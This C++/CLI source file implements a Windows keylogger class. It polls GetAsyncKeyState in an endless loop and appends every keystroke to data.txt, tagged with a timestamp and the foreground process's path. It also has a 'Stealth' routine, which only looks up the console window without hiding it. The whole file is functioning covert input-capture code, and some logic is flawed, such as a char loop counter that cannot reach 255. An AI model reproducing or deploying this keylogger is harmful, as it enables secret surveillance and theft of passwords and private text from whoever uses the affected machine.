#include "GetKey.h"
//===============================================================================
CGetKey::CGetKey(void){
	
}
//===============================================================================
CGetKey::~CGetKey(void){
	
}
//===============================================================================
void CGetKey::StartGeting(void){
	String^ laststr;
	Stealth();
	char i;
	while (1){
		for (i = 8; i <= 255; i++)
			if (GetAsyncKeyState(i) ==-32767)
				Save(i, "log.txt",laststr);
	}
}
//===============================================================================
int CGetKey::Save(int key_stroke, char *file,String^ %laststr){
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;
	System::DateTime^ usedate = gcnew System::DateTime;
	usedate = DateTime::Now;
	TCHAR buffer[MAX_PATH];
	GetActiveProcessName(buffer, MAX_PATH);
	StreamWriter^ myfile = gcnew StreamWriter("data.txt", true);
	String^ nowstr = gcnew String(buffer);
	if (laststr != nowstr){
		myfile->WriteLine();
		myfile->WriteLine();
		myfile->WriteLine(usedate+"\n"+nowstr);
		myfile->Write("\t");
		laststr = nowstr;
	}
	if (key_stroke >= 0x41 && key_stroke<= 0x5A)
		myfile->Write(tolower((char)key_stroke));
	else if(key_stroke >= 0x30 && key_stroke<= 0x39)
		myfile->Write((char)key_stroke);
	else{
		switch (key_stroke)
		{
		case 8:			myfile->Write("[BACKSPACE]");						break;
		case 13:		myfile->WriteLine(); myfile->Write("\t");			break;
		case 32:		myfile->Write(" ");									break;
		case VK_TAB:	myfile->Write("[TAB]");								break;
		case VK_SHIFT:	myfile->Write("[SHIFT]");							break;
		case VK_ESCAPE:	myfile->Write("[ESCAPE]");							break;
		case VK_END:	myfile->Write("[END]");								break;
		case VK_HOME:	myfile->Write("[HOME]");							break;
		case VK_LEFT:	myfile->Write("[LEFT]");							break;
		case VK_UP:		myfile->Write("[UP]");								break;
		case VK_RIGHT:	myfile->Write("[RIGHT]");							break;
		case VK_DOWN:	myfile->Write("[DOWN]");							break;
		case VK_CONTROL:myfile->Write("[CONTROL]");							break;
		case VK_DELETE:	myfile->Write("[DELETE]");							break;
		case VK_MENU:	myfile->Write("[ALT]");								break;
		case VK_CAPITAL:myfile->Write("[CAPS LOCK]");						break;
		case VK_LWIN:	myfile->Write("[LAFT WIN]");						break;
		case VK_RWIN:	myfile->Write("[RIGHT WIN]");						break;
		case 0x21:		myfile->Write("[PAGE UP]");							break;
		case 0x22:		myfile->Write("[PAGE DOWN]");						break;
		case 0x2C:		myfile->Write("[PRINT SCREEN]");					break;
		case 0x2D:		myfile->Write("[INSERT]");							break;
		case 0x70:		myfile->Write("[F1]");								break;
		case 0x71:		myfile->Write("[F2]");								break;
		case 0x72:		myfile->Write("[F3]");								break;
		case 0x73:		myfile->Write("[F4]");								break;
		case 0x74:		myfile->Write("[F5]");								break;
		case 0x75:		myfile->Write("[F6]");								break;
		case 0x76:		myfile->Write("[F7]");								break;
		case 0x77:		myfile->Write("[F8]");								break;
		case 0x78:		myfile->Write("[F9]");								break;
		case 0x79:		myfile->Write("[F10]");								break;
		case 0x7A:		myfile->Write("[F11]");								break;
		case 0x7B:		myfile->Write("[F12]");								break;
//===================================================================================
//the key in this area can't be catch when using un USA keyboard
		case 0xBA:		myfile->Write(";");									break;
		case 0xBF:		myfile->Write("/");									break;
		case 0xC0:		myfile->Write("`");									break;
		case 0xDB:		myfile->Write("[");									break;
		case 0xDC:		myfile->Write("\\");								break;
		case 0xDD:		myfile->Write("]");									break;
		case 0xDE:		myfile->Write("\"");								break;
		case 0xBB:		myfile->Write("=");									break;
		case 0xBE:		myfile->Write(".");									break;
		case 0xBD:		myfile->Write("-");									break;
//===================================================================================
		case 0x60:		myfile->Write("[N0]");								break;
		case 0x61:		myfile->Write("[N1]");								break;
		case 0x62:		myfile->Write("[N2]");								break;
		case 0x63:		myfile->Write("[N3]");								break;
		case 0x64:		myfile->Write("[N4]");								break;
		case 0x65:		myfile->Write("[N5]");								break;
		case 0x66:		myfile->Write("[N6]");								break;
		case 0x67:		myfile->Write("[N7]");								break;
		case 0x68:		myfile->Write("[N8]");								break;
		case 0x69:		myfile->Write("[N9]");								break;
		case 0x6A:		myfile->Write("[N*]");								break;
		case 0x6B:		myfile->Write("[N+]");								break;
		case 0x6D:		myfile->Write("[N-]");								break;
		case 0x6E:		myfile->Write("[N.]");								break;
		case 0x6F:		myfile->Write("[N/]");								break;
		case 0x90:		myfile->Write("[NUM LOCK]");						break;
		default:		myfile->Write("[UNDEFINE]");						break;
		}
	}
	delete usedate;
	myfile->Close();
	return 0;
}
//===============================================================================
void CGetKey::Stealth(){
	HWND stealth;
	stealth = FindWindowA("ConsoleWindowClass", NULL);
}
//===============================================================================
bool CGetKey::GetActiveProcessName(TCHAR *buffer, DWORD cchLen){
	HWND fg = GetForegroundWindow();
	if (fg)
	{
		DWORD pid;
		GetWindowThreadProcessId(fg, &pid);
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
		if (hProcess)
		{
			BOOL ret = QueryFullProcessImageName(hProcess, 0, buffer, &cchLen);
			CloseHandle(hProcess);
			return (ret != FALSE);
		}
	}
	return false;
}
//===============================================================================
void CGetKey::clrFile(void){
	StreamWriter^ myfile = gcnew StreamWriter("data.txt");
	myfile->Close();
	delete myfile;
}
//===============================================================================